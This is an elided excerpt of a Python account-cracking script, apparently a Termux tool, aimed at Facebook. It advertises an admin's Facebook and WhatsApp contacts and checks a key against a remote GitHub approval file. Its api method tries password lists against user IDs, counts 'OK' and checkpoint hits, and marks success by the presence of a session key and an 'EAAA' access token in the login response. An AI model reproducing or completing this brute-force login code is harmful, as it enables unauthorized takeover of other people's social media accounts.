...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/TajulislamOfficail")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> 01770602964")
	subprocess.check_output(["am", "start", "https://wa.me/8801770602964"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/😈😈TheLegend/OLD-CRACK/main/Approve.txt').text
			if basesplit in plr:
				key = basesplit
...
\x1b[0;91m\x1b[1;43m                  SYC0 TH3 BR4ND :)                 \x1b[0m""")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [THE 😈😈] : %s/%s -> \033[0;92m [ 😈😈-OK:%s ]- \033[0;94m[😈😈-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;94m[😈😈-CP] %s|%s\033[0;97m         "%(uid, pw))
